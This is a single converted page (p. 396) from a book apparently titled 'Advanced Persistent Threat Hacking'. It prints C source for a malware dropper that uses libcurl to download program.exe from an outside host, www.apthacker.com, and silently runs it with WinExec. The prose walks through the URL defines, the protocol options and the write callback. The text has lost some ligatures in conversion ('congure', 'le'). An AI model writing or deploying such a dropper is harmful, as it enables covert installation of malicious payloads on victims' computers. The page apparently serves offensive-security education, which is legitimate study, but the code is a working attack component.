<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1a3" class="pf w2 h2" data-page-no="1a3"><div class="pc pc1a3 w2 h2"><div class="t m0 xbe h10 y83 ff1 fs9 fc0 sc0 lsa ws0">396<span class="_ _d"> </span><span class="ff2 fs2 ls8">Advanced Persistent Threat Hacking<span class="_ _1e"/> </span></div><div class="t m0 x3 h40 ya7f fff fs5 fc0 sc0 ls0 ws0">    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback); </div><div class="t m0 x3 h40 ya80 fff fs5 fc0 sc0 ls0 ws0">    curl_easy_setopt(curl, CURLOPT_WRITEDATA, outFile);</div><div class="t m0 x3 h40 ya81 fff fs5 fc0 sc0 ls0 ws0">    res = curl_easy_perform(curl);</div><div class="t m0 x3 h40 y2566 fff fs5 fc0 sc0 ls0 ws0">   curl_easy_cleanup(curl);</div><div class="t m0 x3 h40 y2567 fff fs5 fc0 sc0 ls0 ws0">   fclose(outFile);</div><div class="t m0 x3 h40 y2568 fff fs5 fc0 sc0 ls0 ws0">  }</div><div class="t m0 x3 h40 y2569 fff fs5 fc0 sc0 ls0 ws0">  WinExec( FILENAME , 0);</div><div class="t m0 x3 h40 y256a fff fs5 fc0 sc0 ls0 ws0">  return 0;</div><div class="t m0 x3 h40 y256b fff fs5 fc0 sc0 ls0 ws0">}</div><div class="t m0 x3 h40 y256c fff fs5 fc0 sc0 ls0 ws0">size_t write_callback(void *buffer, size_t size, size_t nitems, void *userp)</div><div class="t m0 x3 h40 y256d fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y256e fff fs5 fc0 sc0 ls0 ws0"> FILE *file = (FILE *)userp; </div><div class="t m0 x3 h40 y256f fff fs5 fc0 sc0 ls0 ws0"> size_t write; </div><div class="t m0 x3 h40 y2570 fff fs5 fc0 sc0 ls0 ws0"> write = fwrite(buffer, size, nitems, file); </div><div class="t m0 x3 h40 y2571 fff fs5 fc0 sc0 ls0 ws0"> return write; </div><div class="t m0 x3 h40 y2572 fff fs5 fc0 sc0 ls0 ws0">}</div><div class="t m0 x4 hd y2573 ff4 fs7 fc0 sc0 ls0 ws0">In this example, we’<span class="_ _2"/>re using the three denes in the beginning to congure the </div><div class="t m0 x3 hd y2574 ff4 fs7 fc0 sc0 ls0 ws0">target URL. <span class="_ _1b"/>Y<span class="_ _3"/>ou can see the protocol is congured as HTTP<span class="_ _3"/>, but you can change </div><div class="t m0 x3 hd y2575 ff4 fs7 fc0 sc0 ls0 ws0">this to almost any protocol supported by cURL, e<span class="_ _0"/>xcept for some of the “secure” </div><div class="t m0 x3 hd y2576 ff4 fs7 fc0 sc0 ls0 ws0">protocols such as HTTPS, as we hav<span class="_ _0"/>e not yet included a library to handle the </div><div class="t m0 x3 hd y2577 ff4 fs7 fc0 sc0 ls0 ws0">encryption.</div><div class="t m0 x3 h44 y2578 fff fse fc0 sc0 ls0 ws0">#define PROTO "http"</div><div class="t m0 x3 h44 y2579 fff fse fc0 sc0 ls0 ws0">#define WEBSITE "www.apthacker.com"</div><div class="t m0 x3 h44 y257a fff fse fc0 sc0 ls0 ws0">#define FILENAME "program.exe"</div><div class="t m0 x4 hd y257b ff4 fs7 fc0 sc0 ls0 ws0">The dropper then requests the le http://www<span class="_ _2"/>.apthacker<span class="_ _2"/>.com/program.exe, sa<span class="_ _0"/>ves it </div><div class="t m0 x3 hd y257c ff4 fs7 fc0 sc0 ls0 ws0">to the current directory<span class="_ _2"/>, and executes it using the <span class="_ _2"/>WinEx<span class="_ _0"/>ec function.</div><div class="t m0 x4 hd y257d ff4 fs7 fc0 sc0 ls0 ws0">As you can see, the cURL code needed to specify the URL of the target le </div><div class="t m0 x3 hd y257e ff4 fs7 fc0 sc0 ls0 ws0">makes the request, and then sa<span class="_ _0"/>ve the le is all v<span class="_ _0"/>ery straightforward. <span class="_ _0"/>The CURLOPT_</div><div class="t m0 x3 hd y257f ff4 fs7 fc0 sc0 ls0 ws0">WRITEFUNCTION option sets the callback function to handle writing the data </div><div class="t m0 x3 hd y2580 ff4 fs7 fc0 sc0 ls0 ws0">recei<span class="_ _0"/>ved:</div><div class="t m0 x3 h44 y2581 fff fse fc0 sc0 ls0 ws0">  curl = curl_easy_init();</div><div class="t m0 x3 h44 y2582 fff fse fc0 sc0 ls0 ws0">  if(curl) {</div><div class="t m0 x3 h44 y2583 fff fse fc0 sc0 ls0 ws0">    curl_easy_setopt(curl, CURLOPT_URL, finalURL );</div><div class="t m0 x3 h44 y2584 fff fse fc0 sc0 ls0 ws0">   /* curlopt_writefunction must be used with </div><div class="t m0 x3 h44 y2585 fff fse fc0 sc0 ls0 ws0">      curlopt_writedata on a windows box or it will crash the prog */</div><a class="" href="http://www.apthacker.com/program.exe"><div class="d m1" style="border-style:none;position:absolute;left:290.370370px;bottom:264.900983px;width:177.000000px;height:12.000000px;background-color:rgba(255,255,255,0.000001);"/></a></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>